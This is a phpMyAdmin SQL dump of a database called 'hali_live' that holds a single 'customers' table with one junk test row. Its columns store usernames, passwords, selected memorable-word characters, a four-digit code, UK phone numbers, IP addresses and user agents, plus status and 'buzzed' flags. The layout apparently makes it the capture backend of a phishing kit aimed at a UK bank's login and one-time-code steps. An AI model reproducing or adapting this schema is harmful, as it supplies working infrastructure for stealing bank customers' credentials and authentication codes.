-- phpMyAdmin SQL Dump
-- version 4.9.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 11, 2020 at 04:46 PM
-- Server version: 8.0.17
-- PHP Version: 7.3.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `hali_live`
--

-- --------------------------------------------------------

--
-- Table structure for table `customers`
--

CREATE TABLE `customers` (
  `id` int(255) NOT NULL,
  `user` varchar(255) DEFAULT NULL,
  `pass` varchar(255) DEFAULT NULL,
  `askchar1` varchar(4) DEFAULT NULL,
  `askchar2` varchar(4) DEFAULT NULL,
  `askchar3` varchar(4) DEFAULT NULL,
  `char1` varchar(1) DEFAULT NULL,
  `char2` varchar(1) DEFAULT NULL,
  `char3` varchar(1) DEFAULT NULL,
  `code` varchar(4) DEFAULT NULL,
  `phonenumber` varchar(255) NOT NULL DEFAULT '+44 7*********',
  `ip` varchar(255) DEFAULT NULL,
  `useragent` text,
  `status` varchar(255) DEFAULT '0',
  `uniqueid` bigint(255) DEFAULT NULL,
  `buzzed` int(255) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `customers`
--

INSERT INTO `customers` (`id`, `user`, `pass`, `askchar1`, `askchar2`, `askchar3`, `char1`, `char2`, `char3`, `code`, `phonenumber`, `ip`, `useragent`, `status`, `uniqueid`, `buzzed`) VALUES
(4, 'asfsdf', 'sdfsdfs', '213', '123', '432', 'b', 'a', 'a', '911', '45678567', '127.0.0.1', 'Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A78.0%29+Gecko%2F20100101+Firefox%2F78.0', '4', 1594483789, 1);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `customers`
--
ALTER TABLE `customers`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `customers`
--
ALTER TABLE `customers`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
